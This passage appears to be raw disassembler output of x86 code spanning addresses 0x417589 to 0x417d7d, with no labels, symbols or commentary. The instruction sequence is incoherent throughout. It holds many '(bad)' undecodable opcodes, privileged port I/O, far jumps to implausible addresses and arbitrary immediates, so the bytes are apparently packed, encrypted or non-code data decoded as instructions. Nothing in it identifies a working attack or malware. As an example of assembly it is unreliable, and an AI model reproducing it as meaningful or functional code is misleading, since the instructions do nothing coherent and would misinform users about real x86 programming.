  417589:	mov    BYTE PTR [ebx+0x72c81ba2],ah
  41758f:	adc    edx,DWORD PTR [esi+eiz*1]
  417592:	pop    ecx
  417593:	cld    
  417594:	xchg   esi,eax
  417595:	push   0x76569cce
  41759a:	outs   dx,DWORD PTR ds:[esi]
  41759b:	stos   BYTE PTR es:[edi],al
  41759c:	js     0x4175e8
  41759e:	lods   al,BYTE PTR ds:[esi]
  41759f:	add    al,0x43
  4175a1:	or     bl,BYTE PTR [ebp-0x3e]
  4175a4:	(bad)  
  4175a6:	hlt    
  4175a7:	inc    ebp
  4175a8:	aaa    
  4175a9:	push   esi
  4175aa:	xor    eax,0xcfb8a875
  4175af:	and    dh,BYTE PTR ds:0x76dcbd8f
  4175b5:	ret    
  4175b6:	cmc    
  4175b7:	jne    0x417637
  4175b9:	mov    eax,ds:0xf547b6b
  4175be:	into   
  4175bf:	mov    ebx,0xd8c6bf51
  4175c4:	test   al,0x18
  4175c6:	dec    eax
  4175c7:	dec    esi
  4175c8:	retf   
  4175c9:	(bad)  [edi-0x1dbbca7a]
  4175cf:	jg     0x4175a8
  4175d1:	xchg   BYTE PTR [edx],ah
  4175d3:	cld    
  4175d4:	pop    ebx
  4175d5:	mov    esi,0x92ae83bf
  4175da:	out    dx,eax
  4175db:	xor    dh,BYTE PTR [eax-0x75]
  4175de:	jl     0x41757f
  4175e0:	cs loope 0x4175dd
  4175e3:	push   es
  4175e4:	jle    0x4175ea
  4175e6:	out    0x6c,eax
  4175e8:	cli    
  4175e9:	push   0xe0b7a179
  4175ee:	sub    eax,0x8d28145a
  4175f3:	cwde   
  4175f4:	xor    ch,BYTE PTR [esi+0x3a]
  4175f7:	jge    0x417649
  4175f9:	push   0x1ed281cf
  4175fe:	pop    esi
  4175ff:	aam    0x3c
  417601:	int3   
  417602:	xchg   dh,al
  417604:	imul   ebx,DWORD PTR [eax],0xffffffd6
  417607:	xchg   DWORD PTR [esi+0x58],eax
  41760a:	or     ebp,DWORD PTR [ecx]
  41760c:	scas   eax,DWORD PTR es:[edi]
  41760d:	nop
  41760e:	adc    eax,0x8e00a3cf
  417613:	das    
  417614:	clc    
  417615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417616:	scas   eax,DWORD PTR es:[edi]
  417617:	mov    ch,0xb1
  417619:	aas    
  41761a:	pop    es
  41761b:	stos   BYTE PTR es:[edi],al
  41761c:	dec    eax
  41761d:	sar    dh,0x75
  417620:	dec    ebx
  417621:	pusha  
  417622:	xchg   esp,eax
  417623:	jnp    0x4175bf
  417625:	jnp    0x417602
  417627:	mov    cl,0xd2
  417629:	rol    BYTE PTR [ebp+edx*2+0x52e16ef4],0xbd
  417631:	aaa    
  417632:	push   ds
  417633:	sbb    cl,BYTE PTR [esi]
  417635:	sub    al,0x38
  417637:	jge    0x41763d
  417639:	fucomip st,st(3)
  41763b:	std    
  41763c:	jo     0x41760c
  41763e:	jmp    0x2d78aa4a
  417643:	mov    ebp,0x123f68df
  417648:	shl    BYTE PTR [ebx+0x7b],cl
  41764b:	jmp    0x5ebf:0xf9f3db03
  417652:	xor    al,0x72
  417654:	mov    fs,esi
  417656:	cmp    BYTE PTR [eax+0x6c614b63],0xcc
  41765d:	cmp    BYTE PTR [esi-0x49254d5],cl
  417663:	mov    ebp,ebp
  417665:	loop   0x417639
  417667:	retf   
  417668:	addr16 addr16 jae 0x417651
  41766c:	call   0xa00a6d9c
  417671:	into   
  417672:	adc    al,0x37
  417674:	sti    
  417675:	or     BYTE PTR [esi+0x6d3b6291],cl
  41767b:	xchg   BYTE PTR [edi-0x77],bl
  41767e:	xor    DWORD PTR [ecx+0x64],edx
  417681:	mov    edi,0xc58e637f
  417686:	sub    al,BYTE PTR [edx-0x28]
  417689:	push   0x431600f9
  41768e:	stc    
  41768f:	out    dx,eax
  417690:	mul    BYTE PTR gs:[edi-0x238a6c31]
  417697:	ins    DWORD PTR es:[edi],dx
  417698:	or     eax,0x44cc00b4
  41769d:	inc    edi
  41769e:	ret    
  41769f:	add    eax,0x251e0ddf
  4176a4:	pop    edi
  4176a5:	cmp    al,0xe0
  4176a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a8:	pop    esp
  4176a9:	loop   0x41767b
  4176ab:	mov    ?,WORD PTR [ebx-0x5d]
  4176ae:	sbb    esp,DWORD PTR [edi+0x19]
  4176b1:	aad    0xaf
  4176b3:	(bad)  
  4176b5:	mov    esp,DWORD PTR ds:[ecx+edx*8-0xf6b2483]
  4176bd:	or     cl,BYTE PTR [eax]
  4176bf:	push   esp
  4176c0:	dec    ebp
  4176c1:	jbe    0x4176eb
  4176c3:	cmp    al,0x9a
  4176c5:	cld    
  4176c6:	in     eax,dx
  4176c7:	pop    ecx
  4176c8:	cmp    edi,ebp
  4176ca:	jecxz  0x417727
  4176cc:	and    BYTE PTR [edi-0x56ebc18e],bh
  4176d2:	dec    edi
  4176d3:	pusha  
  4176d4:	inc    ebp
  4176d5:	xchg   ebp,eax
  4176d7:	xchg   edi,eax
  4176d8:	repz cli 
  4176da:	fist   WORD PTR [eax-0x3c3d4cd0]
  4176e0:	ficom  WORD PTR [eax]
  4176e2:	shr    BYTE PTR [ebx-0x32dc32d9],cl
  4176e8:	std    
  4176e9:	xor    eax,0xd2f28f96
  4176ee:	push   ss
  4176ef:	and    dh,al
  4176f1:	dec    edi
  4176f2:	popa   
  4176f3:	xchg   ebp,eax
  4176f4:	sub    ch,BYTE PTR [ebx-0xe]
  4176f7:	stc    
  4176f8:	sbb    ah,BYTE PTR [edi]
  4176fa:	mov    dl,0xdf
  4176fc:	inc    ebp
  4176fd:	pushf  
  4176fe:	aas    
  4176ff:	jno    0x4176d9
  417701:	mov    BYTE PTR [eax-0x65239c5a],ah
  417707:	call   0xbf5ecd61
  41770c:	fstp   QWORD PTR [eax+0x22ee1563]
  417712:	cmp    dl,bh
  417714:	clc    
  417715:	clc    
  417716:	lock push edx
  417718:	mov    bh,dl
  41771a:	xor    eax,DWORD PTR [esi]
  41771c:	jo     0x4176af
  41771e:	in     eax,dx
  41771f:	xchg   BYTE PTR [esi+eiz*4],ch
  417722:	(bad)  
  417723:	ficomp WORD PTR [edi-0x6a]
  417726:	pop    es
  417727:	call   FWORD PTR [eax+0x1f8ef409]
  41772d:	push   esi
  41772e:	loopne 0x41776f
  417730:	(bad)  
  417731:	mov    BYTE PTR [ebx],bh
  417733:	test   BYTE PTR [ebx+0x63],0xc4
  417737:	hlt    
  417738:	xchg   esp,eax
  417739:	scas   eax,DWORD PTR es:[edi]
  41773a:	sti    
  41773b:	mov    ch,0xc1
  41773d:	mov    edi,0xe6946777
  417742:	jne    0x4177ac
  417744:	enter  0xcf4f,0xcf
  417748:	les    ebx,FWORD PTR [esi+0x1]
  41774b:	dec    ecx
  41774c:	dec    edx
  41774d:	mov    eax,ds:0x186fef4f
  417752:	xor    DWORD PTR [ebp+0x31],ecx
  417755:	lea    esi,[edx]
  417757:	and    al,0x2
  417759:	push   edi
  41775a:	gs pop ecx
  41775c:	repz pusha 
  41775e:	lds    ebx,FWORD PTR [ebx+0x722a4870]
  417764:	jns    0x417783
  417766:	and    ebx,DWORD PTR [eax+eax*2+0x7e665d37]
  41776d:	xchg   esi,eax
  41776e:	jno    0x41770d
  417770:	jmp    0x20cd:0x3c343d18
  417777:	out    0x35,eax
  417779:	adc    eax,0x1c62f027
  41777e:	outs   dx,BYTE PTR ds:[esi]
  41777f:	pop    ebp
  417780:	fisttp WORD PTR [edi-0x43f13cac]
  417786:	shl    BYTE PTR [edi-0x102f5718],cl
  41778c:	lods   eax,DWORD PTR ds:[esi]
  41778d:	fwait
  41778e:	and    ebx,DWORD PTR [ecx+0x5c898178]
  417794:	push   es
  417795:	mov    edx,0x9ea2bdeb
  41779a:	dec    esp
  41779b:	(bad)  
  41779c:	fadd   DWORD PTR [eax-0x20]
  41779f:	push   ebp
  4177a0:	jns    0x417801
  4177a2:	cmp    bl,BYTE PTR [ecx]
  4177a4:	push   es
  4177a5:	pop    ecx
  4177a6:	sub    eax,0x9c021ca7
  4177ab:	dec    ebp
  4177ac:	add    eax,0xe8ef5ecd
  4177b1:	inc    ebp
  4177b2:	ds xor ebx,esi
  4177b5:	push   edx
  4177b6:	mov    esi,DWORD PTR [esi-0x25c5b3ca]
  4177bc:	out    0x81,al
  4177be:	dec    ebx
  4177bf:	cmp    esi,ebp
  4177c1:	inc    ebx
  4177c2:	adc    eax,0xaf6e3f78
  4177c7:	jmp    0xdff9ec0a
  4177cc:	cdq    
  4177cd:	jbe    0x41781f
  4177cf:	mov    edi,0x124ce576
  4177d4:	sbb    DWORD PTR [edx+ecx*8+0x16b843be],0x548f6f11
  4177df:	in     al,0xea
  4177e1:	(bad)  
  4177e2:	add    BYTE PTR [ecx-0x30e0027e],ch
  4177e8:	jbe    0x4177c8
  4177ea:	nop
  4177eb:	jge    0x4177c7
  4177ed:	stc    
  4177ee:	pop    ebx
  4177ef:	sub    BYTE PTR [ebp-0x5e],al
  4177f2:	retf   0x5379
  4177f5:	les    ebp,FWORD PTR [eax+0x62ab6ccc]
  4177fb:	sub    eax,0x91f7442b
  417800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417801:	fs in  al,dx
  417803:	mov    ch,0x10
  417805:	mov    edi,DWORD PTR [ebx-0x6c028d29]
  41780b:	shl    DWORD PTR [esi+0x41],1
  41780e:	mov    bl,0x74
  417810:	fmul   st(6),st
  417812:	and    dl,dh
  417814:	xchg   DWORD PTR [esp+ebx*4-0x18],eax
  417818:	push   cs
  417819:	add    ebp,DWORD PTR [esi+0x345940c9]
  41781f:	jmp    DWORD PTR [edx]
  417821:	pop    es
  417822:	add    DWORD PTR [edx+0x368204b8],0xbf550537
  41782c:	jmp    0x4177ea
  41782e:	not    BYTE PTR cs:[edx]
  417831:	push   ss
  417832:	inc    ecx
  417833:	jbe    0x4177c5
  417835:	enter  0x3e98,0x36
  417839:	adc    BYTE PTR [edx-0x18],ah
  41783c:	mov    edx,0xc0ce3a36
  417841:	push   cs
  417842:	sar    BYTE PTR cs:[edi+0x78],cl
  417846:	inc    ebx
  417847:	scas   al,BYTE PTR es:[edi]
  417848:	mov    ss,ebp
  41784a:	dec    esp
  41784b:	or     DWORD PTR [edi+0x11],edx
  41784e:	mov    esp,0x21bca926
  417853:	add    al,0xee
  417855:	mov    ah,0xd0
  417857:	push   es
  417858:	mov    ds:0x733f76b2,eax
  41785d:	out    0xba,al
  41785f:	push   ds
  417860:	mov    cl,0x73
  417862:	xchg   BYTE PTR [ebx-0x5ddd217],ch
  417868:	sub    dl,BYTE PTR [ecx]
  41786a:	dec    eax
  41786b:	push   0x48
  41786d:	xchg   ecx,eax
  41786e:	and    ah,al
  417870:	xor    eax,0x7db98a9c
  417875:	jb     0x417852
  417877:	shl    BYTE PTR [esi],0x9e
  41787a:	pop    esp
  41787b:	(bad)  
  41787c:	xor    BYTE PTR [ebp+0x37d9a1bf],bl
  417882:	scas   eax,DWORD PTR es:[edi]
  417883:	gs ja  0x417873
  417886:	pop    esp
  417887:	daa    
  417888:	mov    ebp,0x6bd8603e
  41788d:	out    dx,al
  41788e:	std    
  41788f:	push   es
  417890:	fisttp WORD PTR [edi]
  417892:	ror    BYTE PTR [edx+0x508f090d],0x7b
  417899:	sub    DWORD PTR [ebx+0x374c7cfc],edx
  41789f:	mov    ?,WORD PTR [ecx-0x1a]
  4178a2:	inc    edi
  4178a3:	dec    edx
  4178a4:	or     edx,DWORD PTR [si]
  4178a7:	scas   eax,DWORD PTR es:[edi]
  4178a8:	cmp    al,0x8c
  4178aa:	dec    ebp
  4178ab:	fisub  WORD PTR [ebp-0x2b1c41ad]
  4178b1:	sbb    DWORD PTR [eax],esi
  4178b3:	inc    esi
  4178b4:	lock sbb al,0x63
  4178b7:	dec    ebx
  4178b8:	jecxz  0x417916
  4178ba:	cmc    
  4178bb:	sub    esp,DWORD PTR [esp+ebp*1-0x8]
  4178bf:	hlt    
  4178c0:	pop    ecx
  4178c1:	(bad)  
  4178c2:	jnp    0x41787f
  4178c4:	fwait
  4178c5:	cmp    al,ch
  4178c7:	cmp    eax,0xa83ab126
  4178cc:	mov    al,0x1d
  4178ce:	sub    al,0x1a
  4178d0:	cdq    
  4178d1:	jmp    0x2a0d002f
  4178d6:	addr16 jle 0x417888
  4178d9:	adc    al,0x4
  4178db:	pop    es
  4178dc:	fstp   TBYTE PTR ds:0x19a3c003
  4178e2:	push   ebx
  4178e3:	out    dx,al
  4178e4:	not    BYTE PTR [ebx-0x2a51c3db]
  4178ea:	mov    esp,0xe301ff90
  4178ef:	jmp    0x417923
  4178f1:	push   0x64
  4178f3:	jmp    0x8b13e40c
  4178f8:	mov    ebx,0xe9e97e6c
  4178fd:	mul    DWORD PTR [ebp+0x21]
  417900:	leave  
  417901:	aad    0xe
  417903:	jg     0x4178c6
  417905:	xor    bh,BYTE PTR [edi+0x346a4f59]
  41790b:	inc    esi
  41790c:	mov    ds:0x655d532c,eax
  417911:	jmp    0x417918
  417913:	in     al,0x16
  417915:	xor    DWORD PTR [eax+0xd3a76b6],0x71
  41791c:	outs   dx,BYTE PTR ds:[esi]
  41791d:	or     DWORD PTR fs:[eax],edx
  417920:	outs   dx,BYTE PTR ds:[esi]
  417921:	in     eax,0x6e
  417923:	lods   al,BYTE PTR ds:[esi]
  417924:	inc    ecx
  417925:	add    al,0xf6
  417927:	enter  0xd7d5,0x59
  41792b:	(bad)  
  41792c:	out    dx,al
  41792d:	cmp    esi,DWORD PTR [esi]
  41792f:	cmp    al,0xff
  417931:	mov    ?,WORD PTR [ebp+edx*8+0x4d]
  417935:	loop   0x417968
  417937:	xchg   BYTE PTR [edx],dh
  417939:	mov    dl,0xb
  41793b:	pop    ebx
  41793c:	lods   al,BYTE PTR ds:[esi]
  41793d:	dec    esp
  41793e:	and    bl,BYTE PTR [esi]
  417940:	pop    esp
  417941:	fcompp 
  417943:	xchg   BYTE PTR [ecx],ah
  417945:	ins    BYTE PTR es:[edi],dx
  417946:	hlt    
  417947:	jo     0x4178f9
  417949:	adc    eax,0x5089c6a8
  41794e:	push   cs
  41794f:	sbb    eax,0xb1451b81
  417954:	mov    ebp,0xd2907c44
  417959:	jbe    0x4178e2
  41795b:	rol    DWORD PTR [ecx+ebx*1+0x69908572],0x54
  417963:	cmp    al,0xb5
  417965:	popf   
  417966:	std    
  417967:	mov    ds:0xa6860db4,al
  41796c:	dec    edx
  41796d:	mov    eax,0x44397eb
  417972:	fsubr  DWORD PTR [edi-0x30]
  417975:	jbe    0x41794f
  417977:	test   BYTE PTR [bp+di],dl
  41797a:	adc    DWORD PTR [eax-0x1],eax
  41797d:	shr    BYTE PTR [ebx+0x446df26a],1
  417983:	mov    esi,DWORD PTR [ebp+0x7b]
  417986:	(bad)  
  417987:	(bad)  [edx]
  417989:	imul   esi,DWORD PTR [ebp+esi*8-0x49ecbd5d],0x58c8086
  417994:	jmp    0x4ec02acb
  417999:	pop    DWORD PTR [eax+edi*8]
  41799c:	push   0x72377491
  4179a1:	movd   DWORD PTR [edx],mm5
  4179a4:	jmp    0x4179b2
  4179a6:	popf   
  4179a7:	inc    ecx
  4179a8:	daa    
  4179a9:	sub    al,0xd7
  4179ab:	push   edi
  4179ac:	inc    eax
  4179ad:	popf   
  4179ae:	inc    ebx
  4179af:	ret    
  4179b0:	jne    0x417945
  4179b2:	and    al,0x7a
  4179b4:	mov    bl,0xa2
  4179b6:	xor    edx,DWORD PTR [esi+esi*2-0x3a]
  4179ba:	dec    ebp
  4179bb:	mov    al,ds:0x3a6f9761
  4179c0:	inc    edi
  4179c1:	mov    esp,0xd807621
  4179c6:	xchg   esp,eax
  4179c7:	mov    ds:0x4ea8a26,al
  4179cc:	fisubr DWORD PTR [esi+0x53]
  4179cf:	or     al,0x6d
  4179d1:	jbe    0x4179bd
  4179d3:	mov    ebx,0x164af3c1
  4179d8:	cmp    BYTE PTR ds:0xd1e7eac3,ah
  4179de:	sbb    DWORD PTR [ecx+esi*8],0x61aaa319
  4179e5:	and    DWORD PTR [ebp+0x27622636],edx
  4179eb:	js     0x417a49
  4179ed:	cmp    esi,DWORD PTR [eax-0x48]
  4179f0:	sbb    dl,dh
  4179f2:	cwde   
  4179f3:	cld    
  4179f4:	fmul   st(0),st
  4179f6:	arpl   WORD PTR [edx],dx
  4179f8:	arpl   WORD PTR [ebp+0x27],di
  4179fb:	cmc    
  4179fc:	cdq    
  4179fd:	stos   BYTE PTR es:[edi],al
  4179fe:	jg     0x4179ed
  417a00:	push   esp
  417a01:	push   0xfffffffc
  417a03:	inc    ebp
  417a04:	mov    edx,0x87cf271f
  417a09:	stos   WORD PTR es:[edi],ax
  417a0b:	push   0x64149c83
  417a10:	xor    al,0xff
  417a12:	in     al,0x59
  417a14:	mov    eax,0x2e3fc5bf
  417a19:	sbb    DWORD PTR [edi-0x7e91bec4],esp
  417a1f:	repz push 0xffffffec
  417a22:	iret   
  417a23:	jg     0x417a34
  417a25:	inc    dx
  417a27:	inc    eax
  417a28:	xchg   DWORD PTR [ecx+ecx*4],ecx
  417a2b:	push   edi
  417a2c:	jo     0x417aa2
  417a2e:	jmp    0x43ffd862
  417a33:	arpl   WORD PTR [edx+0x5e],si
  417a36:	into   
  417a37:	scas   al,BYTE PTR es:[edi]
  417a38:	mov    al,ds:0xba4b115d
  417a3d:	jo     0x417a33
  417a3f:	jb     0x4179ee
  417a41:	into   
  417a42:	outs   dx,DWORD PTR ds:[esi]
  417a43:	std    
  417a44:	pop    ecx
  417a45:	xchg   esi,eax
  417a46:	mov    ebp,0x87cb83c8
  417a4b:	int3   
  417a4c:	leave  
  417a4d:	cmp    DWORD PTR [esi],0x9
  417a50:	imul   ecx,ecx,0xdbc1f329
  417a56:	inc    ebp
  417a57:	int    0x4
  417a59:	or     ecx,DWORD PTR [edx+0x4b]
  417a5c:	mov    bl,0xbd
  417a5e:	cmp    ch,ch
  417a60:	stos   BYTE PTR es:[edi],al
  417a61:	jg     0x417a2a
  417a63:	nop
  417a64:	xchg   ecx,eax
  417a65:	pushf  
  417a66:	lods   al,BYTE PTR ds:[esi]
  417a67:	push   eax
  417a68:	cmp    edi,esp
  417a6a:	pop    edi
  417a6b:	xor    bh,BYTE PTR [ecx]
  417a6d:	fimul  WORD PTR ds:0x5cd9dd59
  417a73:	popa   
  417a74:	dec    esi
  417a75:	les    ecx,FWORD PTR [ebp+0x14e65c19]
  417a7b:	mov    ch,0x17
  417a7d:	and    bl,BYTE PTR [ebx]
  417a7f:	mov    bl,0xa1
  417a81:	sub    bl,al
  417a83:	mov    edx,0x8f2f7f55
  417a88:	ins    BYTE PTR es:[edi],dx
  417a89:	ror    BYTE PTR [esi+esi*4],1
  417a8c:	xchg   esi,eax
  417a8d:	call   0x6d2beb9c
  417a92:	(bad)
  417a95:	jnp    0x417ad8
  417a97:	jmp    0x417a25
  417a99:	adc    eax,0xff903580
  417a9e:	jle    0x417a31
  417aa0:	xor    ax,WORD PTR [ebx-0x6f9d4d86]
  417aa7:	loopne 0x417aa3
  417aa9:	stc    
  417aaa:	jb     0x417a30
  417aac:	push   0xee5a3195
  417ab1:	ins    DWORD PTR es:[edi],dx
  417ab2:	ins    DWORD PTR es:[edi],dx
  417ab3:	mov    ebp,0xdfe7d956
  417ab8:	jle    0x417a4e
  417aba:	(bad)  
  417abb:	pop    edi
  417abc:	pop    DWORD PTR [eax-0x1d]
  417abf:	cli    
  417ac0:	sub    DWORD PTR [edx+esi*1-0x75],ebx
  417ac4:	pushf  
  417ac5:	jle    0x417a83
  417ac7:	push   es
  417ac8:	mov    dl,0x8d
  417aca:	inc    ebp
  417acb:	cmp    bh,dl
  417acd:	js     0x417b14
  417acf:	dec    edx
  417ad0:	jp     0x417b0e
  417ad2:	pushf  
  417ad3:	cmp    edi,DWORD PTR [edi+0x2]
  417ad6:	mov    cs,WORD PTR [edi]
  417ad8:	ret    0x9669
  417adb:	fincstp 
  417add:	mov    bh,0x4f
  417adf:	icebp  
  417ae0:	mov    gs,WORD PTR [ecx+0x10]
  417ae3:	popa   
  417ae4:	sar    bl,0x19
  417ae7:	pop    es
  417ae8:	mov    eax,ds:0xbaec19ca
  417aed:	out    dx,eax
  417aee:	add    eax,0xebb05db3
  417af3:	divps  xmm1,XMMWORD PTR [ebp+0x65dcbe7e]
  417afa:	jecxz  0x417b4c
  417afc:	push   ebp
  417afd:	scas   al,BYTE PTR es:[edi]
  417afe:	rol    BYTE PTR [esi-0xaa131c],1
  417b04:	inc    esp
  417b05:	inc    esi
  417b06:	clc    
  417b07:	sub    ecx,DWORD PTR [edx+eiz*1-0x1f871d5c]
  417b0e:	daa    
  417b0f:	push   esp
  417b10:	jg     0x417af3
  417b12:	and    bh,BYTE PTR ds:0x5a974407
  417b18:	ret    
  417b19:	pop    edi
  417b1a:	mov    cl,0xe8
  417b1c:	push   ebx
  417b1d:	mov    ch,0x52
  417b1f:	and    DWORD PTR [edi+0x18],edx
  417b22:	daa    
  417b23:	pop    edi
  417b24:	lahf   
  417b25:	and    ebp,esi
  417b27:	fldlg2 
  417b29:	jmp    0x417ba6
  417b2b:	daa    
  417b2c:	mov    edx,0xb3b9b74e
  417b31:	push   ecx
  417b32:	fdivr  DWORD PTR [ecx-0x6c]
  417b35:	or     dl,BYTE PTR [ecx-0x3adb371a]
  417b3b:	or     ch,BYTE PTR [edi+0x50effd5d]
  417b41:	jp     0x417b78
  417b43:	xor    eax,0xc04af6e2
  417b48:	mov    ebp,0x18ea3804
  417b4d:	or     DWORD PTR [edx+0x3d4ddfb3],esi
  417b53:	sar    BYTE PTR [edi-0x19],0x59
  417b57:	xor    edx,DWORD PTR [ebx-0x1d]
  417b5a:	out    0xbf,eax
  417b5c:	sub    eax,0x27403005
  417b61:	out    0xb0,al
  417b63:	je     0x417bd3
  417b65:	out    0xab,eax
  417b67:	push   edx
  417b68:	inc    BYTE PTR [ebp+0x34c1cecf]
  417b6e:	stc    
  417b6f:	or     DWORD PTR [edx-0x305220e8],edx
  417b75:	std    
  417b76:	and    al,0xf7
  417b78:	jae    0x417b30
  417b7a:	or     eax,0x6b6d67b5
  417b7f:	addr16 pop ebp
  417b81:	ficom  WORD PTR [ecx-0x425b03f4]
  417b87:	into   
  417b88:	in     al,0xdf
  417b8a:	cld    
  417b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b8c:	fidivr DWORD PTR ds:0xc2d2a7e8
  417b92:	scas   eax,DWORD PTR es:[edi]
  417b93:	jg     0x417c0e
  417b95:	mov    BYTE PTR [ecx],ch
  417b97:	mov    al,BYTE PTR [edi-0x2f]
  417b9a:	push   cs
  417b9b:	mov    BYTE PTR [ebx-0x386a1c3c],ah
  417ba1:	xchg   ecx,eax
  417ba2:	lock std 
  417ba4:	pop    eax
  417ba5:	int    0x49
  417ba7:	xor    DWORD PTR [ebx+0x3],esp
  417baa:	mov    cs,ecx
  417bac:	outs   dx,DWORD PTR ds:[esi]
  417bad:	fld    st(2)
  417baf:	shl    DWORD PTR [ebp+0x2bc091af],0x1a
  417bb6:	stc    
  417bb7:	inc    esp
  417bb8:	cmp    eax,0xb6f604bf
  417bbd:	ja     0x417bd7
  417bbf:	push   DWORD PTR [ebp-0x6d]
  417bc2:	sar    BYTE PTR [edx],0x72
  417bc5:	dec    edx
  417bc6:	sbb    al,0x6c
  417bc8:	std    
  417bc9:	mov    bh,0x78
  417bcb:	fld    TBYTE PTR [esi+0x4]
  417bce:	push   eax
  417bcf:	scas   eax,DWORD PTR es:[edi]
  417bd0:	push   0xa07b0614
  417bd5:	call   0xc9de:0xc40b9ae5
  417bdc:	add    dh,BYTE PTR [edx+0xf3c4e0b]
  417be2:	sub    ecx,DWORD PTR [eax-0x322f60d3]
  417be8:	sub    al,0x48
  417bea:	enter  0xdc70,0x9
  417bee:	inc    ebx
  417bef:	std    
  417bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf1:	dec    esp
  417bf2:	push   ebx
  417bf3:	dec    ebp
  417bf4:	shl    BYTE PTR [eax-0xb388f81],1
  417bfa:	adc    BYTE PTR [bp+si],0xdc
  417bfe:	mov    esi,0x3a1f55b5
  417c03:	inc    edx
  417c04:	mov    ch,0x1a
  417c06:	je     0x417be5
  417c08:	sbb    al,0xde
  417c0a:	adc    eax,0x64952c5d
  417c0f:	retf   
  417c10:	repnz inc esi
  417c12:	ins    DWORD PTR es:[edi],dx
  417c13:	neg    BYTE PTR [esi+0x7]
  417c16:	retf   0xbdad
  417c19:	mov    ebp,0xdac24479
  417c1e:	out    0xc2,eax
  417c20:	push   ebx
  417c21:	dec    eax
  417c22:	jmp    0xc7d8d571
  417c27:	ret    0xf4dc
  417c2a:	popf   
  417c2b:	or     DWORD PTR [ebx-0x3d],eax
  417c2e:	push   edi
  417c2f:	inc    eax
  417c30:	leave  
  417c31:	vaddsubps xmm6,xmm5,xmm7
  417c35:	sbb    cl,BYTE PTR [ecx+ebx*1-0x33]
  417c39:	repz loop 0x417c82
  417c3c:	ror    DWORD PTR [edx+0x7d],cl
  417c3f:	aas    
  417c40:	sub    al,dl
  417c42:	add    esi,DWORD PTR [ecx]
  417c44:	push   cs
  417c45:	nop
  417c46:	or     BYTE PTR [ecx+0xff32b26],bl
  417c4c:	lock dec edi
  417c4e:	mov    edi,0x3d24016d
  417c53:	sub    DWORD PTR [esi-0x78],eax
  417c56:	hlt    
  417c57:	xchg   BYTE PTR [edi+0x2],dh
  417c5a:	sbb    eax,ebp
  417c5c:	xchg   esp,esi
  417c5e:	fadd   DWORD PTR [ecx-0x80e8c1e]
  417c64:	aas    
  417c65:	push   edi
  417c66:	mov    eax,ds:0xda79d627
  417c6b:	jnp    0x417cde
  417c6d:	mov    ds:0xcfc1e496,eax
  417c72:	stc    
  417c73:	fwait
  417c74:	arpl   WORD PTR [ecx-0x23],bp
  417c77:	out    dx,eax
  417c78:	popa   
  417c79:	fwait
  417c7a:	mov    bh,0x21
  417c7c:	sub    al,0x71
  417c7e:	jmp    DWORD PTR [ecx]
  417c80:	jno    0x417c82
  417c82:	cmp    DWORD PTR [di+0x33],ebx
  417c86:	mov    al,ds:0x2795db12
  417c8b:	sub    al,0xed
  417c8d:	fldenv [ebp-0x708cc302]
  417c93:	dec    edx
  417c94:	cmp    al,0xe5
  417c96:	loope  0x417ca9
  417c98:	(bad)  
  417c99:	std    
  417c9a:	pop    esp
  417c9b:	test   al,0x8c
  417c9d:	xor    ah,BYTE PTR [edx-0x1bc6d14e]
  417ca3:	pusha  
  417ca4:	jmp    DWORD PTR [edi]
  417ca6:	fsubr  st(3),st
  417ca8:	jg     0x417c38
  417caa:	aam    0xf
  417cac:	mov    edi,0x8c258f53
  417cb1:	popf   
  417cb2:	lahf   
  417cb3:	push   ss
  417cb4:	loop   0x417c8e
  417cb6:	dec    ebx
  417cb7:	pop    ss
  417cb8:	fcomi  st,st(7)
  417cba:	push   ds
  417cbb:	iret   
  417cbc:	loopne 0x417d16
  417cbe:	adc    edi,DWORD PTR [edx-0x48aa7dce]
  417cc4:	mov    dl,0x89
  417cc6:	shl    DWORD PTR [ebp+0x7b],1
  417cc9:	ret    0x27b5
  417ccc:	mov    ch,0x5
  417cce:	cmp    eax,0xab3ec03e
  417cd3:	xchg   DWORD PTR [edi-0x78],ebp
  417cd6:	test   eax,0x60802449
  417cdb:	(bad)  
  417cdd:	inc    ecx
  417cde:	js     0x417d1a
  417ce0:	push   0xfffffff9
  417ce2:	dec    eax
  417ce3:	mov    esi,0x670d2455
  417ce8:	bound  edx,QWORD PTR [edx]
  417cea:	cld    
  417ceb:	cmp    eax,0x324c6afd
  417cf0:	add    eax,0x4e97429b
  417cf5:	or     al,0x2
  417cf7:	inc    esi
  417cf8:	fsubr  DWORD PTR [edx+0x55]
  417cfb:	fidivr WORD PTR [edx]
  417cfd:	(bad)  
  417cfe:	sbb    al,0xa9
  417d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d01:	(bad)  
  417d02:	adc    bh,BYTE PTR [ebx]
  417d04:	and    BYTE PTR [eax-0x47abc957],cl
  417d0a:	cmp    eax,0x297dd406
  417d0f:	xchg   esp,eax
  417d10:	hlt    
  417d11:	adc    dh,BYTE PTR [ecx]
  417d13:	sbb    BYTE PTR [esi-0x247885f6],bl
  417d19:	jno    0x417d2a
  417d1b:	clc    
  417d1c:	scas   al,BYTE PTR es:[edi]
  417d1d:	into   
  417d1e:	pop    esi
  417d1f:	or     edi,DWORD PTR [eax+0x49]
  417d22:	rcr    BYTE PTR [esi+ebx*4+0xc],1
  417d26:	mov    ?,WORD PTR [ebp+0x4320a775]
  417d2c:	jecxz  0x417d0e
  417d2e:	pop    edx
  417d2f:	mov    ebp,0x24bbd127
  417d34:	rcl    ah,0x49
  417d37:	aad    0xa
  417d39:	clc    
  417d3a:	cmp    eax,0xe01db163
  417d3f:	sbb    DWORD PTR [ebx-0x11],esi
  417d42:	dec    ecx
  417d43:	lods   eax,DWORD PTR ds:[esi]
  417d44:	or     eax,0x3ce5ba08
  417d49:	and    bh,al
  417d4b:	mov    edx,0x8001e4b1
  417d50:	sbb    ebp,DWORD PTR [edx+0x7ef229dd]
  417d56:	cmp    eax,0xcd9fc3fe
  417d5b:	jmp    0xbc535447
  417d60:	imul   ebx,DWORD PTR [ecx-0x6a],0xf2f1b82a
  417d67:	hlt    
  417d68:	push   esp
  417d69:	in     eax,0x9f
  417d6b:	nop
  417d6c:	in     eax,dx
  417d6d:	mov    ecx,0xed2dddbc
  417d72:	mov    esi,0x7ee38f6c
  417d77:	lds    edx,FWORD PTR [ecx-0x23]
  417d7a:	adc    BYTE PTR [eax-0x7f],dl
  417d7d:	(bad)  
